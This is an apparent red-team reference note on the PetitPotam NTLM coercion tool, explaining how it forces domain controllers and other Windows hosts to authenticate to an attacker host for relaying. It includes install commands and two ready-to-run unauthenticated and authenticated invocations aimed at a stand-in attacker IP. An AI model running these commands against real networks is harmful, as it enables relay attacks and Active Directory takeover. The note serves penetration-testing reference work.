---
creation date: November 29th 2021
last modified date: November 29th 2021
aliases: []
tags: #🧰 
---

Primary Categories: [[01 - Operation]] 
Secondary Categories:  [[02 - Internal]]
Links: 
Search Tag: #🧰  

# [[PetitPotam]]  
___

## Description:
PetitPotam can be used to coerce machine account authentication to an attacker controlled host. This authentication can then be relayed, with a number of potential use cases, including ADCS web enrollment exploitation, shadow credential/RBCD attacks, and potentially as a substitiute for initial credential compromise.

## Installation
Clone from GitHub. There is no `requirements.txt` or `setup.py`, but you will need Impacket.
```
git clone https://github.com/topotam/petitpotam
pip3 install impacket
```

## Commands
Ensure something ([[Impacket#ntlmrelayx.py]] or [[Responder]] with lm downgrade) is listening to capture the authentication 

### Unauthenticated 
Attempt to coerce authentication from domain controllers, without prior authenticated access (only possible on DCs, and requires that they are unpatched)
```
python3 PetitPotam.py -u '' -p '' -d '' KALI_IP DC_IP
```

## Authenticated 
Attempt to coerce authentication from any domain Windows machine, using compromised authentication
```
python3 PetitPotam.py -u user1 -p Password1 -d domain.local KALI_IP DC_IP
```

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |
| https://github.com/topotam/PetitPotam | Git Repo |
| https://www.truesec.com/hub/blog/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory | ADCS Relay Example |

Created Date: December 17th 2021 (10:16 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
